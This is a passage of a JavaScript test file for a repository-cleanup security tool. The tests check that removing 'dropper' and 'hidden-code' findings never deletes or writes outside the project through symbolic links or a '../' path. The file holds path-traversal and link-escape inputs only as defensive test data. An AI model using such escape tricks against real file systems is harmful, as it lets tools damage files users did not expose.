  assert.equal(readFileSync(path.join(outside, 'config.bat'), 'utf8'), 'node_modules\nconfig.bat\n', 'nothing outside the project may change');
  assert.ok(changes.some((x) => x.failed), JSON.stringify(changes));
  rmSync(base, { recursive: true, force: true });
});

test('fix removes a dropper that is a link without touching what it points at', (t) => {
  const base = tmp();
  const repo = path.join(base, 'project');
  const outside = path.join(base, 'elsewhere');
  mkdirSync(repo);
  mkdirSync(outside);
  writeFileSync(path.join(outside, 'keep.txt'), 'keep\n');
  const link = path.join(repo, 'config.bat');
  if (!linkDir(outside, link)) {
    rmSync(base, { recursive: true, force: true });
    t.skip('this platform does not allow creating links');
    return;
  }
  const changes = fix({ root: repo, findings: [{ level: 'high', file: 'config.bat', rule: 'dropper', fix: 'delete' }] });
  assert.ok(!existsSync(link), 'the link should be removed');
  assert.equal(readFileSync(path.join(outside, 'keep.txt'), 'utf8'), 'keep\n', 'the folder it pointed at must survive');
  assert.ok(changes.some((x) => x.action === 'deleted'), JSON.stringify(changes));
  rmSync(base, { recursive: true, force: true });
});

test('fix refuses a finding whose path points outside the project', () => {
  const base = tmp();
  const repo = path.join(base, 'project');
  mkdirSync(repo);
  const outside = path.join(base, 'keep.txt');
  writeFileSync(outside, 'keep\n');
  const changes = fix({ root: repo, findings: [{ level: 'high', file: '../keep.txt', rule: 'dropper', fix: 'delete' }] });
  assert.equal(readFileSync(outside, 'utf8'), 'keep\n');
  assert.ok(existsSync(outside), 'a ../ path must never delete outside the project');
  assert.ok(changes.some((x) => x.failed && /outside the project/.test(x.action)), JSON.stringify(changes));
  rmSync(base, { recursive: true, force: true });
});

test('agent --write never writes through a symbolic link', { skip: noFileLinks }, () => {
  const base = tmp();
  const root = path.join(base, 'project');
  mkdirSync(root);
  const outside = path.join(base, 'notes.md');
  writeFileSync(outside, '# Mine\n');
  symlinkSync(outside, path.join(root, 'CLAUDE.md'), 'file');
  const res = spawnSync(process.execPath, [BIN, 'agent', root, '--write'], { encoding: 'utf8' });
  assert.equal(res.status, 0, res.stdout + res.stderr);
  assert.match(res.stdout, /skip/);
  assert.equal(readFileSync(outside, 'utf8'), '# Mine\n', 'the file the link points at must not change');
  assert.ok(!readFileSync(outside, 'utf8').includes('forkguard'), 'no rules may be written outside the project');
  rmSync(base, { recursive: true, force: true });
});

test('a target that is itself a link is refused on every platform', (t) => {
  const base = tmp();
  const root = path.join(base, 'project');
  const outside = path.join(base, 'elsewhere');
  mkdirSync(root);
  mkdirSync(outside);
  writeFileSync(path.join(outside, 'keep.txt'), 'keep\n');
  if (!linkDir(outside, path.join(root, 'CLAUDE.md'))) {
    rmSync(base, { recursive: true, force: true });
    t.skip('this platform does not allow creating links');
    return;
  }
  const res = spawnSync(process.execPath, [BIN, 'agent', root, '--write'], { encoding: 'utf8' });
  assert.equal(res.status, 0, res.stdout + res.stderr);
  assert.match(res.stdout, /refusing to write through a symbolic link/);
  assert.deepEqual(readdirSync(outside), ['keep.txt'], 'nothing may be written into the folder the link points at');
  rmSync(base, { recursive: true, force: true });
});

test('fix refuses a config file that links to a folder outside the project', (t) => {
  const base = tmp();
  const root = path.join(base, 'project');
  const outside = path.join(base, 'elsewhere');
  mkdirSync(root);
  mkdirSync(outside);
  writeFileSync(path.join(outside, 'keep.txt'), 'keep\n');
  if (!linkDir(outside, path.join(root, 'postcss.config.js'))) {
    rmSync(base, { recursive: true, force: true });
    t.skip('this platform does not allow creating links');
    return;
  }
  const changes = fix({ root, findings: [{ level: 'high', file: 'postcss.config.js', rule: 'hidden-code', fix: 'strip' }] });
  assert.ok(changes.some((x) => x.failed && /symbolic link/.test(x.action)), JSON.stringify(changes));
  assert.deepEqual(readdirSync(outside), ['keep.txt']);
  rmSync(base, { recursive: true, force: true });
});

test('the pull request text is plain and lists what changed', async () => {
  const { prBody } = await import('../src/pr.js');
  const body = prBody([{ file: 'init', action: 'deleted' }, { file: 'package.json', action: 'cleaned' }], []);
  assert.match(body, /- `init`: deleted/);
  assert.match(body, /- `package.json`: cleaned/);
  assert.ok(!/undefined|\n\n\n/.test(body));
  assert.match(body, /Change their GitHub, npm and cloud tokens/);
});
